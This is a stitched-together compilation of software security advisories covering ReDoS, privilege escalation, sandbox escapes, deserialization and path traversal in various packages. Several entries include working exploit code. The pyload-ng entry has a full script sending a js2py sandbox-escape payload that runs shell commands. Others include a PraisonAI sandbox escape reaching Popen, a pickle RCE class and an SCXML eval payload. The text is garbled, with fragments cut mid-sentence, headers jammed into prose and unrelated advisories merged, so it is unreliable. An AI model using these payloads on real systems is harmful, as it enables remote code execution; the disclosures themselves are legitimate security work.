- After the digest is stripped, `Decode()` accepts **any** password, so operators who believe the password gates integrity receive no error even when the wrong password is supplied.

## Description

### Summary

On a self-hosted, single-tenant Budibase instance (`multiTenancy:false`), the public bootstrap endpoint `POST /api/global/users/init` remains fully exploitable **after** the instance has been provisioned. advisories.summary: wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)
advisories.description:
# Summary

With default flags, a pattern that contains several `*` wildcards takes polynomial time, O(n^k) for k stars, to reject a crafted file name. The pattern is an ordinary developer constant such as `*_*_*_*_*.csv`; only the string being matched comes from the attacker. A 255-byte file name (the maximum on common filesystems) takes 73 s with `fnmatch.fnmatch()` and 86 s with `glob.globmatch()`. The standard library's `fnmatch` handles the same input in under a millisecond.

This is different from GHSA-84v8-qmgq-9g88: that advisory covers extglob patterns, while this case needs no flags and no attacker-controlled pattern.

# Details

Every `*` is translated to a lazy `.*?` (`_STAR`, `wcmatch/_wcparse.py:212`; `_PATH_STAR` `[^/]*?`, `:218`), which is emitted in `_handle_star` (`:1405-1424`):

```text
*_*_*_*_*.csv  ->  ^(?s:(?=.)(?![.]).*?_.*?_.*?_.*?_.*?\.csv)$
```

When the subject consists of many `_` and does not end in `.csv`, the regex engine tries every way of splitting it between the stars. CPython fixed the same problem in its own `fnmatch` (bpo-40480) by making every star segment except the last one atomic.

# PoC

```python
import time, fnmatch as std
from wcmatch import fnmatch, glob

for pat, n in [('*_*_*_*.csv', 255), ('*_*_*_*.csv', 400), ('*_*_*_*_*.csv', 150),
               ('*_*_*_*_*.csv', 200), ('*_*_*_*_*.csv', 255)]:
    name = '_' * n
    t = time.perf_counter(); fnmatch.fnmatch(name, pat); w = time.perf_counter() - t
    t = time.perf_counter(); std.fnmatchcase(name, pat); s = time.perf_counter() - t
    print(f'{pat:15} len={n}  wcmatch={w:.3f}s  stdlib={s:.5f}s')

t = time.perf_counter(); glob.globmatch('uploads/' + '_' * 255, 'uploads/*_*_*_*_*.csv')
print(f'globmatch {time.perf_counter() - t:.2f}s')
```

wcmatch 11.1, CPython 3.13, macOS:

```text
*_*_*_*.csv     len=255  wcmatch=1.412s   stdlib=0.00001s
*_*_*_*.csv     len=400  wcmatch=8.599s   stdlib=0.00004s
*_*_*_*_*.csv   len=150  wcmatch=5.333s   stdlib=0.00003s
*_*_*_*_*.csv   len=200  wcmatch=22.415s  stdlib=0.00007s
*_*_*_*_*.csv   len=255  wcmatch=72.732s  stdlib=0.00047s
globmatch 85.75s
```

`glob.glob('*_*_*_*.csv', root_dir=d)` on a real directory that contains one file named `'_' * 255` takes 1.7 s.

# Impact

Applications that match untrusted names against multi-star patterns can be blocked on a single CPU core for minutes per name. Examples: upload handlers, archive or object-store key filters, and `glob`/`WcMatch` scans of directories where other users ca

# Summary Every sibling `` adds another level of the parent's indentation, so the size of `get_text()` output grows quadratically with the number of tables. The following `close_block()` never pops it; only `Canvas.close_tag()` calls `prefix.remove_last_prefix()`. So each table leaves one extra padding entry on the stack.     ' + '
a
' * 4 + '') ' a\n \n a\n \n a\n \n a\n ' ``` # PoC ```python import sys, time, resource from inscriptis import get_text n = int(sys.argv[1]) html = "
    " + "
    " * n + "
" t = time.time(); out = get_text(html) print(len(html), f"{time.time()-t:.2f}s", len(out), resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 2**20, "MiB") ``` inscriptis 2.7.5, Python 3.11, macOS (2.0.0 behaves the same): | tables | HTML | time | output chars | peak RSS | |---|---|---|---|---| | 1,000 | 15 KB | 0.02 s | 4.0 M | 31 MiB | | 4,000 | 60 KB | 0.33 s | 64 M | 154 MiB | | 8,000 | 120 KB | 1.31 s | 256 M | 463 MiB | | 16,000 | 240 KB | 5.63 s | 1,024 M | 991 MiB | When the input doubles, output size and memory grow about 4 times. # Impact Any application that converts untrusted HTML with inscriptis can be made to exhaust memory with a small document. No authentication and no user interaction are needed. # Fix ```diff self.canvas.write(self, text, whitespace=WhiteSpace.pre) if self.display == Display.block: + self.canvas.current_block.prefix.remove_last_prefix() self.canvas.close_block(self) ``` With this change the 240 KB input above produces 288 K characters in 0.14 s with 27 MiB peak RSS. A single table renders exactly as before, and the existing test suite passes.

advisories.summary: contao/core-bundle: Non-admin users can self-grant permissions that implicitly make them administrators
advisories.description:
Commit `2b83a60f7763` (5.7.3) hardened the template editor: it added `TemplateEditorModuleVoter` + `CheckTemplateEditorSaveListener` so a non-admin cannot self-grant the `tpl_editor` backend module (editable PHP-capable templates permit server-side code execution). That voter supports only the `modules` field and the literal value `tpl_editor`.

The equally RCE-capable `theme_import` capability lives in a different field - the `themes` checkbox field (tl_user_group.php:98-105 options include `theme_import`; identical on tl_user.php:248-253) - which has no save_callback and no voter. `TemplateEditorModuleVoter` is the only DC voter registered for tl_user_group, and it does not cover the `themes` field. So a delegated user manager can add `theme_import` to their own (or a managed) account.

Live repro (Contao 5.7.9):
1. As admin, create a non-admin backend group with the `user` (or `group`) module (a delegated user manager), and a user in it. Confirm the user cannot access `tpl_editor` (blocked by the 5.7.3 voter).
2. As that non-admin, edit a group/account: add `themes` to the modules field and `theme_import` to the themes field (both accepted - only `tpl_editor` is blocked). Re-authenticate.

## Impact

A delegated user/group manager (a role explicitly not trusted with template/code access) escalates to arbitrary PHP execution on the server, fully compromising the installation. This bypasses the exact protection the 5.7.3 `tpl_editor` fix introduced.

## Credits

advisories.summary: AIT-GUI route chain allows unauthenticated Python execution in server process

## Summary
A security issue exists where unauthenticated callers can instruct the AIT-GUI server to execute arbitrary Python scripts. The attack vector involves obtaining a session cookie through GET /, followed by a malicious POST /script/run request containing an absolute file path that bypasses the configured script directory restrictions.

### Patches
* 2.5.1

### Impact
This vulnerability allows unauthenticated remote code execution on the AIT-GUI server. Any attacker with network access can execute arbitrary Python code with daemon privileges.

## Details
_Chain:_
1. `POST /tlm/query` writes the user-controlled `fields` value into `fields_in.txt` under the AIT-GUI static directory.
   *  If the supplied `dataDir` has no `.pcap` files, the route returns the expected `400 Bad Request` before deleting that file.
2. `POST /script/run` accepts `scriptPath=../static/fields_in.txt`.
   * AIT-GUI reads that file and runs it as Python.

_Relevant code:_
- `ait/gui/__init__.py:930,935,942-944`: `/tlm/query` writes `fields` to `fields_in.txt`.
- `ait/gui/__init__.py:952-958,978`: the no-PCAP error path aborts before cleanup.
- `ait/gui/__init__.py:1130-1136`: `/script/run` joins `scriptPath` with `ScriptRoot` and only checks that the path exists.
- `ait/gui/__init__.py:1186-1191`: the selected file is read and executed as Python.
- `ait/gui/__init__.py:1105-1108`: nearby `/scripts/load/<name>` has a path containment check, but `/script/run` does not.

### Fix Information
Restricted script execution paths and avoided using static temp files.

## PoC
1. `POST /tlm/query` writes the user-controlled `fields` value into `fields_in.txt` under the AIT-GUI static directory.
   *  If the supplied `dataDir` has no `.pcap` files, the route returns the expected `400 Bad Request` before deleting that file.

advisories.summary: Duplicate Advisory: chcon: recursive relabel not anchored to traversal dirfd (TOCTOU)
advisories.description:
### Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-9rv8-9hvg-92mq. This link is maintained to preserve external references.

### Original Description
A Time-of-Check to Time-of-Use (TOCTOU) vulnerability exists in the chcon utility of uutils coreutils during recursive operations. The implementation resolves recursive targets using a fresh path lookup (via fts_accpath) rather than binding the traversal and label application to the specific directory state encountered during traversal. Because these operations are not anchored to file descriptors, a local attacker with write access to a directory tree can exploit timing-sensitive rename or symbolic link races to redirect a privileged recursive relabeling operation to unintended files or directories. This vulnerability breaks the hardening expectations for SELinux administration workflows and can lead to the unauthorized modification of security labels on sensitive system objects.

This advisory has been withdrawn because it is a duplicate of GHSA-xhrc-7f76-vh96. This link is maintained to preserve external references.

### Original Description
A logic error in the env utility of uutils coreutils causes a failure to correctly parse command-line arguments when utilizing the -S (split-string) option. In GNU env, backslashes within single quotes are treated literally (with the exceptions of \\ and \'). However, the uutils implementation incorrectly attempts to validate these sequences, resulting in an "invalid sequence" error and an immediate process termination with an exit status of 125 when encountering valid but unrecognized sequences like \a or \x. A Time-of-Check to Time-of-Use (TOCTOU) vulnerability exists in the split utility of uutils coreutils. advisories.summary: Safari MCP: JavaScript injection through single-quoted tool arguments (backslash not escaped)
advisories.description:
### Impact

Sixteen places in `safari.js` placed a tool argument inside a single-quoted JavaScript string literal and escaped the single quote without first escaping backslashes. An argument containing a backslash followed by a quote therefore closed the literal, and the rest of the argument ran as JavaScript in the page.

Seven of the affected arguments belong to read-only tools that are exempt from the tab-ownership check: `filter` in `safari_network_details` and `safari_extract_links`, `level` in `safari_console_filter`, `selector` in `safari_snapshot`, `safari_accessibility_snapshot` and `safari_extract_tables`, and `dbName` / `storeName` in `safari_get_indexed_db`. An MCP client limited to read-only tools (with `safari_evaluate` and `safari_run_script` excluded from its allowlist) could still run arbitrary page JavaScript through them, including in a tab the session does not own. The other affected arguments are `ref` in `safari_select_option`, `safari_react_select_set` and `safari_react_select_list_options`, the key in `safari_press_key`, the file name in `safari_upload_file` and `safari_paste_image`, and the first line of the text in `safari_replace_editor`.

### Patches

Fixed in 2.22.15: every affected site uses the shared `escJsSingleQuote`, which escapes the backslash before the quote, and a test fails the build if a quote-only escape returns.

### Workarounds

Upgrade to 2.22.15. There is no configuration workaround: excluding `safari_evaluate` and `safari_run_script` from a client's tool list did not prevent the injection.

### Credits

Reported privately on 2026-10-09 by Aliaksandr Palei (@fakepooh) under the coordinated-disclosure process in SECURITY.md.

advisories.summary: DOMPurify SAFE_FOR_TEMPLATES bypass: split template expressions survive in attached shadow root content on DOM output modes
advisories.description:
## Summary

When DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `<%...%>` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `<template>.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.

## Root Cause

`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.

```text
_scrubTemplateExpressions (src/purify.ts:1717-1751):
  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).
  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).
  - Explicit recursion at lines 1743-1750 enters <template>.content only, via
    querySelectorAll('template'); there is no equivalent recursion into attached
    shadow roots.
Shadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which
applies the per-node strip but never performs the post-walk normalize-and-rescrub.
```

Shadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.

## Impact

An attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it ca

advisories.summary: SAML2: Incomplete fix of CVE-2026-49283: unsigned embedded Response bypasses HTTP-Artifact signature verification (no embedded-Issuer binding)
advisories.description:
## Summary
CVE-2026-49283 / GHSA-6929-8p9f-26jx ("HTTP-Artifact TLS validator confusion allows cross-IdP authentication bypass") was fixed so that `HTTPArtifact::receive()` verifies the embedded SAML `Response` using the IdP metadata signing keys. The current implementation (master `31c72c1d`, released **v6.2.3**) reaches that verification **only when the embedded Response is signed**:

```php
// src/Binding/HTTPArtifact.php  (receive())
if (!$samlResponse->isSigned()) {
    return $samlResponse;                         // ← unsigned embedded Response returned UNVERIFIED
}
return $this->verifyMessageSignature($samlResponse, $idpMetadata);   // only runs when signed
```

An attacker who controls one trusted-federation IdP therefore returns a **validly-signed outer `ArtifactResponse`** (signed with their own real key, which passes the mandatory outer check) that **wraps an *unsigned* `<samlp:Response>` whose `<Issuer>` names a *different* IdP**. `isSigned()` is false, so `verifyMessageSignature()` never runs and the forged Response is returned as successfully received. Additionally, even on the signed path `verifyMessageSignature()` verifies against the **artifact issuer's** metadata keys but **never asserts that the embedded Response's `<Issuer>` equals the artifact issuer** — the same cross-IdP confusion the CVE was assigned for is not closed by identity binding.

This is an incomplete implementation of the fix's own stated goal ("verify signatures using IdP metadata signing keys", commit `dac0b4b6` / #419), and a regression introduced by the `#414` refactor (v6.2.2) — the official CVE fix in **v6.2.1 did not contain this short-circuit**.

  - `receive()` line **206-207**: `if (!$samlResponse->isSigned()) { return $samlResponse; }` — the bypassed guard.
  - `receive()` line 210: `verifyMessageSignature($samlResponse, $idpMetadata)` — only reached when signed.
  - `verifyMessageSignature()` lines 230-286: verifies against `$idpMetadata` (artifact-issuer keys); **no `getIssuer()` comparison** to bind the embedded Response to the artifact issuer.
  - `verifyArtifactResponseSignature()` line **300-302**: `if ($artifactResponse->isSigned() !== true) throw` — the OUTER response is mandatorily signed; the asymmetry with the embedded `return`-on-unsigned is the defect.

advisories.summary: Filament Curator: Cross-tenant media metadata disclosure via Curator picker search
advisories.description:
Summary

  In multitenant Filament panels, an authenticated user could retrieve media metadata belonging to other tenants
  by typing in the Curator media-picker search box. The search query omitted the tenant ownership scope that the
  normal file listing applies.

  Details

  CuratorPanel::updatedSearch() built its Eloquent query independently of getFiles() and did not apply the
  filament()->hasTenancy() && $isTenantAware tenant-ownership where clause. As a result, the search matched media
  across all tenants. A secondary flaw compounded it: the orWhere('title'…) chain was not wrapped in a nested
  group, so the OR conditions also broke out of the isLimitedToDirectory constraint.

  The issue was introduced in v3.2.4, when multitenancy support was added to the media picker.

  Impact

  - Who: any authenticated user with access to a panel that uses the Curator picker.
  - What: disclosure of other tenants' media metadata (name, title, alt, caption, description, path, etc.)
  returned by the search.
  - Conditions: only affects deployments using Filament multitenancy with Curator's tenant awareness enabled.
  Single-tenant installs are not affected.

  Patches

  Fixed in 3.7.8, 4.1.1, and 5.1.1 by applying the tenant scope to the search query and grouping the search terms
  so they cannot escape the directory/tenant constraints. Upgrade to a patched version.

  Workarounds

  None other than upgrading. Disabling tenant awareness does not help (it removes the boundary entirely).

  Credit

  Reported via coordinated disclosure by [Afsana Alijabarova](https://github.com/afa114).

advisories.summary: NLTK: Quadratic CPU exhaustion in LegalitySyllableTokenizer.tokenize via unguarded onset reversal loop
advisories.description:
## Summary

`LegalitySyllableTokenizer.tokenize` in the NLTK tokenizer package contains an unguarded O(n^2) processing loop. When the method is called on a single token that consists of a long run of vowels (for example `"a" * n`), it consumes CPU time proportional to the square of the token length. An attacker who can supply an untrusted token to this public tokenizer API can force a single request to saturate one CPU core for a prolonged period, degrading availability of any service that syllabifies attacker-controlled text. No authentication, special configuration, or user interaction is required.

## Root Cause

The method walks the token in reverse and, on every iteration after the first vowel is seen, evaluates the membership test `char_lower + current_onset[::-1] in self.legal_onsets`. The set `legal_onsets` is built by `onset()`, which returns only the characters up to the first vowel, so every member is vowel-free. For an all-vowel token the first branch can therefore never match, `onset` never becomes `True`, and the reset branch that would clear `current_onset` is never reached. As a result `current_onset` grows by one character on every iteration. Building `current_onset[::-1]` and hashing the resulting string costs O(k) on iteration k, and this is repeated for k from 1 to n, giving total cost O(n^2). The security invariant that is violated is bounded per-token work: there is no length cap on this code path, so untrusted token length translates directly into quadratic CPU consumption.

```text
Affected function: LegalitySyllableTokenizer.tokenize
Source: nltk/tokenize/legality_principle.py (membership-test sink at line 133; loop over token[::-1] beginning at line 126)
Helper establishing the vowel-free onset set: LegalitySyllableTokenizer.onset (nltk/tokenize/legality_principle.py, returns prefix up to first vowel)
```

## Impact

An attacker who controls a token passed to `LegalitySyllableTokenizer.tokenize` can trigger quadratic CPU work. In the reviewed release a token of roughly 64,000 vowel characters takes about 1.8 seconds on a single core, and the cost grows with the square of the length, so a token in the hundreds of kilobytes to megabyte range consumes a core for many seconds to minutes. Memory use is linear. The demonstrated capability is single-core CPU exhaustion leading to denial of service or latency degradation in any network-reachable component that syllabifies untrusted input. There is no confidentiality or integrity impact; t

**CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) chained with CWE-732 (Incorrect Permission Assignment for Critical Resource) and CWE-285 (Improper Authorization) — same class the maintainer codified as Defense Invariant #13 in `lib/builtin.js` and as Category 35 / GHSA-9g8x in `docs/ATTACKS.md`.

(Scope = Changed because the data being read and the state being written both belong to the host process, not the sandbox. Confidentiality = High because `os.userInfo()` returns host UID/GID/username/homedir + `os.networkInterfaces()` returns the full host network topology including container/VM interfaces with IPs and MAC addresses. Integrity = High because `dns.setServers()` is a process-wide write that hijacks every subsequent DNS lookup the host makes — including outbound HTTP, telemetry, npm/registry, and any host code that uses `fetch` or URL-based fs paths. Privileges Required = None because the attacker controls sandbox code, which is the threat model `NodeVM` exists to mitigate.)

advisories.summary: rustls: ECH rejection can expose buffered application data to authenticated outer server before `ech_required` alert
advisories.description:
In rustls 0.23.44 and 0.23.45, application data that a client buffers before the handshake completes is sent to the server even when the server rejects Encrypted Client Hello (ECH).

When the server rejects ECH, the client completes the handshake with the outer ClientHello and authenticates the server against the ECH config's `public_name`. At the end of the handshake, `start_traffic()` encrypts and queues any plaintext buffered by `ClientConnection::writer()`. It does this *before* checking for `EchStatus::Rejected` and queueing the `ech_required` alert.

The application then receives `Error::PeerIncompatible(ServerRejectedEncryptedClientHello)`, as expected. However, the client is still expected to call `write_tls()` to send the fatal alert, and that call also sends the encrypted application data. The server decrypts the data and only then receives the alert.

The ordering bug is older than 0.23.44. Before 0.23.44, the client checked the server certificate against the inner server name rather than `public_name`, so a correctly configured server failed certificate verification first and no data was sent. 0.23.44 fixed that check, which makes the ordinary rejection path reachable.

# Impact

Plaintext meant for the inner server, the one named in the encrypted ClientHello, goes to the client-facing server identified by `public_name`. That server is properly authenticated, so this is not an attack by an unauthenticated party. However this violates [RFC 9849](https://www.rfc-editor.org/info/rfc9849), which says the following:

- Section 6.1.6: if the handshake and authentication succeed after ECH rejection, the client "MUST ... abort the connection with an "ech_required" alert **before sending any application data to the server.**"
- Section 6.1.7: the certificate is checked only against `public_name`, and the connection "MUST NOT" be reported as successful to the application. rustls does report failure correctly. The problem is only that data is sent before the alert.

This affects only clients that meet all of these conditions:

- They use `EchMode::Enable`. GREASE ECH is not affected.
- They write application data before the handshake completes.
- They connect to a server that rejects their ECH config, for example because the config is stale. This is the same case where the server returns retry configs.

The usual client response to rejection is to retry with the server's retry configs. In that case, the data has already gone to the outer server.

advisories.summary: pyload-ng vulnerable to RCE with js2py sandbox escape
advisories.description:
### Summary
Any pyload-ng running under python3.11 or below are vulnerable under RCE. Attacker can send a request containing any shell command and the victim server will execute it immediately.

### Details
js2py has a vulnerability of sandbox escape assigned as [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape), which is used by the `/flash/addcrypted2` API endpoint of pyload-ng. Although this endpoint is designed to only accept localhost connection, we can bypass this restriction using HTTP Header, thus accessing this API and achieve RCE.
 
### PoC

The PoC is provided as `poc.py` below, you can modify the shell command it execute:

```python
import socket
import base64
from urllib.parse import quote

host, port = input("host: "), int(input("port: "))

payload = """
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator;"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}

"""

crypted_b64 = base64.b64encode(b"1234").decode()

data = f"package=pkg&crypted={quote(crypted_b64)}&jk={quote(payload)}"

request = f"""\
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:9666
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}

{data}
""".encode().replace(b"\n", b"\r\n")

def main():

    s = socket.socket()
    s.connect((host, port))

    s.send(request)
    response = s.recv(1024).decode()
    print(response)

if __name__ == "__main__":
    main()


```

### Impact

Anyone who runs the latest version (<=0.5.0b3.dev85) of  pyload-ng under python3.11 or below. pyload-ng doesn't use js2py for python3.12 or above.

advisories.summary: PraisonAI: Python Sandbox Escape via str Subclass startswith() Override in execute_code
advisories.description:
### Summary

`execute_code()` in `praisonai-agents` runs attacker-controlled Python inside a three-layer sandbox that can be fully bypassed by passing a `str` subclass with an overridden `startswith()` method to the `_safe_getattr` wrapper, achieving arbitrary OS command execution on the host.

### Details

`python_tools.py:20` (source) -> `python_tools.py:22` (guard bypass) -> `python_tools.py:161` (sink)
```python
# source -- _safe_getattr accepts any str subclass
def _safe_getattr(obj, name, *default):
    if isinstance(name, str) and name.startswith('_'):  # isinstance passes for subclasses
        raise AttributeError(...)

# hop -- type() is whitelisted in safe_builtins, creates str subclass without class keyword
FakeStr = type('FakeStr', (str,), {'startswith': lambda self, *a: False})

# sink -- Popen reached via __subclasses__ walk
r = Popen(['id'], stdout=PIPE, stderr=PIPE)
```

### PoC
```python

from praisonaiagents.tools.python_tools import execute_code

payload = """
t = type
FakeStr = t('FakeStr', (str,), {'startswith': lambda self, *a: False})

mro_attr  = FakeStr(''.join(['_','_','m','r','o','_','_']))
subs_attr = FakeStr(''.join(['_','_','s','u','b','c','l','a','s','s','e','s','_','_']))
mod_attr  = FakeStr(''.join(['_','_','m','o','d','u','l','e','_','_']))
name_attr = FakeStr(''.join(['_','_','n','a','m','e','_','_']))
PIPE = -1

obj_class = getattr(type(()), mro_attr)[1]
for cls in getattr(obj_class, subs_attr)():
    try:
        m = getattr(cls, mod_attr, '')
        n = getattr(cls, name_attr, '')
        if m == 'subprocess' and n == 'Popen':
            r = cls(['id'], stdout=PIPE, stderr=PIPE)
            out, err = r.communicate()
            print('RCE:', out.decode())
            break
    except Exception as e:
        print('ERR:', e)
"""

result = execute_code(code=payload)
print(result)
# expected output: RCE: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
```

### Impact

Any user or agent pipeline running `execute_code()` is exposed to full OS command execution as the process user. Deployments using `bot.py`, `autonomy_mode.py`, or `bots_cli.py` set `PRAISONAI_AUTO_APPROVE=true` by default, meaning no human confirmation is required and the tool fires silently when triggered via indirect prompt injection.

advisories.summary: python-statemachine SCXML <data expr> Eval Injection
advisories.description:
### Summary

python-statemachine 3.1.2 evaluates `<data expr="...">` attributes in SCXML documents using Python's `eval()`. Any application that passes attacker-controlled SCXML content to `SCXMLProcessor` is vulnerable to arbitrary code execution in the context of the hosting process.

### Details

`SCXMLProcessor.parse_scxml_file()` processes SCXML documents and evaluates `<data>` element `expr` attributes via the following call chain:

```
SCXMLProcessor.parse_scxml_file()
SCXMLProcessor.process_definition()
create_datamodel_action_callable()
_create_dataitem_callable()
_eval()
eval()
```

`_eval()` calls Python's built-in `eval()` directly on the expression string without sandboxing or restriction.

### PoC

```
1. Install:
   pip install python-statemachine==3.1.2

2. Create an SCXML file containing:
   <data id="x" expr="__import__('pathlib').Path('marker.txt').write_text('pwned')"/>

3. Run:
   SCXMLProcessor.parse_scxml_file(DATA_EXPR_CHART)
   SCXMLProcessor.start()

4. During start(), <data expr> reaches _eval(), which calls eval().

5. Result:
   data_marker_before_start: False
   data_marker_after_start: True
   success: True
```

### Impact

This is an eval injection vulnerability (CWE-95). Remote or local code execution depending on whether the consuming application accepts SCXML content from remote users, uploaded files, configuration, plugins, or other untrusted sources.

advisories.summary: pyquokka is Vulnerable to Remote Code Execution by Pickle Deserialization via FlightServer
advisories.description:
### Description

In the FlightServer class of the pyquokka framework, the do_action() method directly uses pickle.loads() to deserialize action bodies received from Flight clients without any sanitization or validation, which results in a remote code execution vulnerability. The vulnerable code is located in pyquokka/flight.py at line 283, where arbitrary data from Flight clients is directly passed to pickle.loads().

Even more concerning, when FlightServer is configured to listen on 0.0.0.0 (as shown in the provided server example at line 339), this allows attackers across the entire network to perform arbitrary remote code execution by sending malicious pickled payloads through the set_configs action.

In addition, the functions cache_garbage_collect, do_put, and do_get also contain vulnerability points where pickle.loads is used to deserialize untrusted remote data. Please review and fix these issues accordingly. This report uses the set_configs action as an example.


### Proof of Concept

* Step 1:
The victim user starts a FlightServer that binds to the network interface, e.g.:
```
server = FlightServer("0.0.0.0", location = "grpc+tcp://0.0.0.0:5005")
server.serve()
````
* Step 2:
The attacker can then send malicious pickle dump data through the Flight client connection. The provided PoC demonstrates how an attacker can execute "ls -l" command:

```python
class RCE:
def __reduce__(self):
import os
return (os.system, ('ls -l',))

import pickle
action_body = pickle.dumps(RCE())
action = pyarrow.flight.Action("set_configs", action_body)
```

When the server receives this payload, the FlightServer.do_action() method calls pickle.loads(action.body.to_pybytes()) on line 283, which triggers the execution of the malicious code through Python's pickle deserialization mechanism. The provided flight_client.py demonstrates a complete PoC that connects to the vulnerable server and executes arbitrary commands through the pickle deserialization vulnerability.

When the vulnerability is reproduced, python flight.py can be run to init the server and then run flight_client.py. There is an attack demo in the attachment.

### Impact

Remote code execution on the victim's machine over the network. Once the victim starts the FlightServer with network binding (especially 0.0.0.0), an attacker on the network can gain arbitrary code execution by connecting to the Flight endpoint and sending crafted pickle payloads through the set_configs action. advisories.summary: OpenMRS Module Upload Vulnerable to Path Traversal (Zip Slip)
advisories.description: ## Affected Versions version ≤ 2.7.8 (latest version at time of disclosure) https://github.com/openmrs/openmrs-core ## Impact The endpoint `POST /openmrs/ws/rest/v1/module` is vulnerable to a path traversal (Zip Slip) attack. An authenticated attacker can upload a crafted `.omod` archive containing ZIP entries with directory traversal sequences. Upon automatic extraction by the server, the incomplete path validation in `WebModuleUtil.startModule()` fails to prevent entries such as `web/module/../../../../malicious.jsp` from being written outside the intended module directory. If the traversal target falls within the web application root (e.g., `/usr/local/tomcat/webapps/openmrs/`), the attacker achieves arbitrary file write and subsequent Remote Code Execution. Notably, other extraction methods in the same codebase (`ModuleUtil.expandJar()`, `TestInstallUtil.addZippedTestModules()`) are properly protected with `normalize().startsWith()` checks — this vulnerability is an oversight where the same fix was not applied. Furthermore, the `module.allow_web_admin` runtime property, which is intended to restrict administrators from managing modules via the web interface, only gates the Legacy UI controller entry point. The REST API endpoint `POST /openmrs/ws/rest/v1/module` does not check this property, allowing this restriction to be fully bypassed. ## Steps to Reproduce 1. Construct a malicious `.omod` file (which is a ZIP/JAR archive) containing a ZIP entry with a path traversal payload in its entry name, such as `web/module/../../../../`. Upload this file to `POST /openmrs/ws/rest/v1/module` with valid admin credentials via Basic Auth. 2. The server parses and loads the module. During `WebModuleUtil.startModule()`, entries under `web/module/` are automatically extracted. The existing check `Paths.get(name).startsWith("..")` only blocks entries beginning with `..`, so an entry starting with `web/module/` passes the check. The `../` sequences in the remaining path cause the file to be written outside the intended `WEB-INF/view/module/` directory — for example, into the web application root at `/usr/local/tomcat/webapps/openmrs/`.

advisories.summary: Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access
advisories.description:
### Summary

An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around "Elo is a safe data/DSL language."

### Vulnerable sink and root cause

Three interacting sites in `src/` produce the bug at commit `749af7b`:

1. **`src/transform.ts:144–158`** — the `member_access` handler allows access on types `any`, `object`, or `array` without filtering the property name. This is the only place an integrator could have plugged a denylist.
2. **`src/compilers/javascript.ts:210`** — the JS emitter writes `${objectExpr}.${ir.property}` verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.
3. **`src/parser.ts:163–170, 748–750`** — the parser accepts `constructor` (and other JS meta-property names) as an ordinary identifier, so `.constructor` clears type-checking without triggering any warning.

Combined, the Elo expression `({}).constructor.constructor('…')()` compiles to a live `Function('…')()` call in the emitted JS, executing in the realm of whichever sink runs the compiled code.

### Attack surfaces

All three surfaces share the same root cause (no denylist in `transform.ts`) and are addressed by the same one-file patch:

| # | Entry point | Threat model |
|---|---|---|
| 1 | Browser playground — `https://elo-lang.org/try/?code=…&run=1` | **0-click XSS / account takeover** against elo-lang.org. `?run=1` triggers `setTimeout(() => this.run(), 100)` in `playground_controller.ts:531`; the server issues a 301 that preserves `?code=`. Any shared URL that contains a payload compromises the visitor's session on elo-lang.org. |

The `-f elo` path is especially severe: the flag exists to pass user-supplied files as *data* into an Elo pipeline. No integrator expects a data-format flag to shell out to `/usr/bin/id`. |
